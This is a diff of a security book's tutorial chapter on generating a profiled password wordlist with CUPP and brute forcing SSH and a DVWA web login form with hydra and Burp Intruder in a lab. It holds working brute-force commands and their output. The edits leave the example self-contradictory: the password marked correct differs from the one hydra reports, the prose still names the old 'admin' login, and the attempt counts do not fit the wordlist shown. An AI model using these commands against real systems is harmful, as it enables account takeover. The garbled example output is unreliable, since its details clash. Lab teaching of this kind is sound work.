@@ -123,7 +123,7 @@ or from the terminal:
 
 Created by Muris Kurgas AKA j0rgan. This tool is easy to use and can be used in an interactive style `-i` where it interviews the person running it before it goes ahead and creates the wordlist output. We installed this in the [Tooling Setup](#tooling-setup-kali-linux-tools-i-use-that-need-adding-to-kali-linux-cupp) chapter.
 
-Once you have git cloned it, as always check the source confirming what you are about to run. Then run it. I like to use the interactive mode `-i`. run it with no arguments to see the help screen.
+Once you have git cloned it, as always check the source confirming what you are about to run. Then run it. I like to use the interactive mode `-i`. run it with no arguments to see the help screen. `cd` into `/opt/cupp/`.
 
 Also have a look through the config file prior to running and change any settings you want to fine tune. It is all pretty straight forward.
 
@@ -149,7 +149,7 @@ There are a number of other options to customise the output.
     
     
     > Child's name: Bob Junior
-    > Child's nickname: lilbob
+    > Child's nickname: Lilbob
     > Child's birthdate (DDMMYYYY): 15172001
     
     
@@ -162,11 +162,11 @@ There are a number of other options to customise the output.
     removed: can we fix it,yes we can
     > Do you want to add special chars at the end of words? Y/[N]: y
     > Do you want to add some random numbers at the end of words? Y/[N]n
-    > Leet mode? (i.e. leet = 1337) Y/[N]: n
+    > Leet mode? (i.e. leet = 1337) Y/[N]: y
     
     [+] Now making a dictionary...
     [+] Sorting list and removing duplicates...
-    [+] Saving dictionary to bob.txt, counting 15773 words.
+    [+] Saving dictionary to bob.txt, counting 31546 words.
     [+] Now load your pistolero with bob.txt and shoot! Good luck!
 
 ##### Who's your Daddy (WyD)
@@ -212,7 +212,7 @@ I discovered this tool in the Hacker Playbook 2. It looks like Kim had some trou
 
 #### Brute Forcing
 
-The following brute force attempts were against the Dam Vulnerable Web App (DVWA) in the OWASPBWA suite running at IP `192.168.90.60`.
+The following brute force attempts were against the Dam Vulnerable Web App (DVWA) in the OWASPBWA suite running at IP `192.168.56.22`.
 
 When it comes to brute forcing web applications, I noticed the failed attempts always took longer than the successful ones (when I told the tool to use a specific search phrase for failure) due to the fact that the failure text you tell the tool to look for is found sometime before the tool has read everything in the response, as it would with a successful response.
 
@@ -234,12 +234,12 @@ or from the terminal.
 {title="SSH", linenos=off, lang=bash}
     hydra -l <username> -P <password or wordlist> <target> <protocol>
     # For example SSH if your SSH port is the default:
-    hydra -l root -P /path/and/wordlist.txt 192.168.90.60 ssh
+    hydra -l root -P /opt/cupp/bob.txt 192.168.56.22 ssh
     # Otherwise specify the port with -s.
     # May as well add some verbosity while we are at it with -v.
     # Also -L for a username wordlist file if you want to try many usernames.
     # Lower case -p for password typed in directly.
-    hydra -s 20 -v -l root -p /path/and/wordlist.txt 192.168.90.60 ssh
+    hydra -s 20 -v -l root -p /path/and/wordlist.txt 192.168.56.22 ssh
     # -l can also be used with a file of usernames.
 
 ![](images/HandsOnHack.png)
@@ -265,7 +265,7 @@ G> Now in Burpsuites Proxy tab -> HTTP history tab, right click on the (`POST`) 
 G>
 Now clear all the highlighted fields apart from the `password` value. Now we go to the Payloads tab. Keep the Payload set to 1 and Payload type set to [Simple list](https://portswigger.net/burp/help/intruder_payloads_types.html).
 G>
-G> Now I just added `dogs`, `cats`, `admins`, `admin`. The last being the correct password. You don't need FoxyProxy on anymore either. Go into the Intruder menu up the top -> Start attack. You will now get a pop up window with the results of the passwords you added. Now with the Response tab and Raw tab selected, start at the top of the requests and just arrow down through them, inspecting the differences as you go. You should see that the last one, that's the `admin` password has one changed value from the other responses. It will have a `Location` header with value of `index.php` rather than `login.php` that all the failed responses contain. That is our difference that we use to feed to our brute forcing tool so that it knows when we have a successful login, even though in theory the login process isn't yet complete as we have not issued the follow up `GET` request, but it does not matter, as we know we would not have been given a `index.php` if we were not authorised.
+G> Now I just added `y35w3c4n!$%`, `y35w3c4n!$&`, `y35w3c4n!$*`, `y35w3c4n!$@`. The last being the correct password. It can pay to have a valid account to test with, especially with `HTTP`. You don't need FoxyProxy on anymore either. Go into the Intruder menu up the top -> Start attack. You will now get a pop up window with the results of the passwords you added. Now with the Response tab and Raw tab selected, start at the top of the requests and just arrow down through them, inspecting the differences as you go. You should see that the last one, that's the `admin` password has one changed value from the other responses. It will have a `Location` header with value of `index.php` rather than `login.php` that all the failed responses contain. That is our difference that we use to feed to our brute forcing tool so that it knows when we have a successful login, even though in theory the login process isn't yet complete as we have not issued the follow up `GET` request, but it does not matter, as we know we would not have been given a `index.php` if we were not authorised.
 G>
 G> Now every web application will do something a bit different. You just need to look for the difference in response from a bad password to a good one and use that to feed to your brute forcing tool.
 G>
@@ -280,16 +280,19 @@ G> From that we build our command. `^USER^` instructs hydra to use the login (`-
 G> So here we go:
 G> 
 G> {linenos=off, lang=bash}
-G>     # First up, lets look at what is in our word list for our initial test.
-G>     cat /root/wordlist-to-throw-at-dvwa
-G>     dogs
-G>     cats
-G>     admins
-G>     admin # Correct password.
+G>     # Taking the output from CUPP from above, which created a 31546 word ordlist.
+G>     # This is a small snippet of our word list for our initial test.
+G>     cat /opt/cupp/bob.txt
+G>     y35w3c4n!$%
+G>     y35w3c4n!$&
+G>     y35w3c4n!$*
+G>     y35w3c4n!$@ # Correct password.
+G>     y35w3c4n!%
+G>     y35w3c4n!%!
 G> 
 G>     # Now lets run our brute force.
 G> 
-G>     hydra -l admin -P /path/and/wordlist.txt 192.168.90.60 http-form-post \
+G>     hydra -l Bob -P /opt/cupp/bob.txt 192.168.56.22 http-form-post \
 G>     "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:login.php" -V
 G>     # Can write attempts to a file with -o <file path>.
 G>     # -v is less verbose
@@ -302,11 +305,11 @@ G>     # -v is less verbose
     [DATA] max 4 tasks per 1 server, overall 64 tasks, \
     4 login tries (l:1/p:4), ~0 tries per task
     [DATA] attacking service http-post-form on port 80
-    [ATTEMPT] target 192.168.90.60 - login "admin" - pass "dogs" - 1 of 4 [child 0]
-    [ATTEMPT] target 192.168.90.60 - login "admin" - pass "cats" - 2 of 4 [child 1]
-    [ATTEMPT] target 192.168.90.60 - login "admin" - pass "admins" - 3 of 4 [child 2]
-    [ATTEMPT] target 192.168.90.60 - login "admin" - pass "admin" - 4 of 4 [child 3]
-    [80][http-post-form] host: 192.168.90.60 login: admin password: admin
+    [ATTEMPT] target 192.168.56.22 - login "Bob" - pass "y35w3c4n!$%" - 14999 of 31546 [child 0]
+    [ATTEMPT] target 192.168.56.22 - login "Bob" - pass "y35w3c4n!$&" - 15000 of 31546 [child 1]
+    [ATTEMPT] target 192.168.56.22 - login "Bob" - pass "y35w3c4n!$*" - 15001 of 31546 [child 2]
+    [ATTEMPT] target 192.168.56.22 - login "Bob" - pass "y35w3c4n!$@" - 15002 of 31546 [child 3]
+    [80][http-post-form] host: 192.168.56.22 login: Bob password: Y35w3c4n!$&
     1 of 1 target successfully completed, 1 valid passwords found
     Hydra (http://www.thc.org/thc-hydra) finished at 2015-11-07 23:23:03
 
@@ -315,7 +318,7 @@ Instead of telling hydra what to look for in a failed attempt (`Login=Login:logi
 `string we expect for success` is hypothetical:
 
 {linenos=off, lang=bash}
-    hydra -l admin -P /path/and/wordlist.txt 192.168.90.60 http-form-post \
+    hydra -l Bob -P /opt/cupp/bob.txt 192.168.56.22 http-form-post \
     "/dvwa/login.php:username=^USER^&password=^PASS^&S=string we expect for success" -V
 
 Hydra has many other options. Plenty of good [documentation](http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/) out there along with a decent man page.
